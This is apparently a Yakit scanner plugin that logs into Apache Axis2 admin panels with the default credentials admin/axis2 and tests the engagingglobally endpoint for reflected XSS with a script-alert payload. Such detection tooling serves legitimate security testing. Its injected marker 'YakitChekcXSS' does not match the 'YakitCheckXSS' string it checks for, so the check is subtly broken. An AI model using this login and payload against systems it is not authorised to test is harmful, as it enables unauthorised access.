# port scan plugin
log.setLevel(`info`)
yakit.AutoInitYakit()


loglevel(`info`)
yakit.AutoInitYakit()

login = func(ip,port,path,rstr){
    addr = str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    packet = `
POST {{params(path)}}axis2-admin/login HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36

userName=admin&password=axis2&submit=+Login+
`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({
        "target":addr,
        "path":path,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8080"),
    poc.session(rstr))
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp, "Welcome to Axis2 Web Admin Module !!"){
            log.info("登录成功，开始进行xss检测...")
            return          
        }
        log.info("请确认账号密码是否为默认账号密码")
        os.Exit(0)
    }
    os.Exit(0)    
    return
}

handleCheck = func(ip,port,path,rstr){
    addr = str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    packet = `GET {{params(path)}}axis2-admin/engagingglobally?submit=%2bEngage%2b&modules=%3Cscript%3Ealert(YakitChekcXSS)%3C/script%3E HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"path":path,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8080"),
    poc.session(rstr)
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp, "<script>alert(YakitCheckXSS)</script>"){
            yakit.Info("%v found Axis2 admin XSS漏洞 ", addr)
            risk.NewRisk(
            addr,risk.title("Axis2 admin XSS"),
            risk.severity("low"),
            risk.titleVerbose("Axis2 admin XSS漏洞"),
            risk.type("xss[Axis2]"),
            risk.payload(`/axis2-admin/engagingglobally?submit=%%2bEngage%%2b&modules=%%3Cscript%%3Ealert(YakitChekcXSS)%%3C/script%%3E`),
        )
        }
       
    }
    return
}

base_href_path=func(ip,port,base_href_rule){
    addr = str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    packet=`GET / HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36`
    rsp,req,err=poc.HTTP(
        packet,
        poc.https(isTls),
        poc.params({"addr":addr}),
        // poc.proxy("http://127.0.0.1:8080")
        )
    if re.Match(base_href_rule, rsp){
        base_href=re.FindSubmatch(rsp, base_href_rule)[1]
        log.info(f"匹配到路径为${base_href}")
        return base_href
    }else{
        log.info("请确认该站点是否存在axis中间件")
        os.Exit(0)
    }
}



handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    base_href_rule=`<base href="https?://.*?(/.*?)"`
    if len(result.Fingerprint.HttpFlows)>0{
        base_href=base_href_path(result.Target,result.Port,base_href_rule)
        rstr=randstr(8)
        login(result.Target,result.Port,base_href,rstr)
        handleCheck(result.Target,result.Port,base_href,rstr)
    }
    
}
